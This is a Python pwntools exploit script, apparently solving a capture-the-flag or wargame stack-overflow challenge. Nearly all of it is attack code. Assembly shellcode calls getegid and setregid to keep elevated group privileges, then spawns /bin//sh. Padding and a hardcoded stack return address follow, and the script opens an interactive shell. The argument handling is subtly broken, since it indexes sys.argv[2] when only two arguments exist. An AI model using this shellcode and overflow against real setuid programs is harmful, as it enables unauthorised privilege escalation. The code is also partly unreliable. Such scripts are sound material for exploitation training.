#!/usr/bin/env python
from pwn import *

prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

target = process(prog)


#######################################################
# EXPLOIT                                             #
#######################################################

arch = 'x86-64'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // write your assembly here

    push $0x6c 
    pop %rax
    syscall
                
    mov %rax, %rsi
    mov %rax, %rdi

    push $0x72
    pop %rax
    syscall

    xor %rsi, %rsi
    xor %rdx, %rdx
    push $0x3b
    pop %rax

    mov $0x68732f6e69622f2f, %rbx
    push %rsi
    push %rbx
    mov %rsp, %rdi

    syscall
'''

compiled = asm(shellcode, arch=arch)

# padding
padding = '123456'
for letter in 'abcdefghijklm': #nopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ':
  padding += letter*8
padding = bytearray(padding, 'utf-8')

ret = b'\x20\xe3\xff\xff\xff\x7f'

payload = compiled + padding + ret 

target.send(payload)
target.interactive()
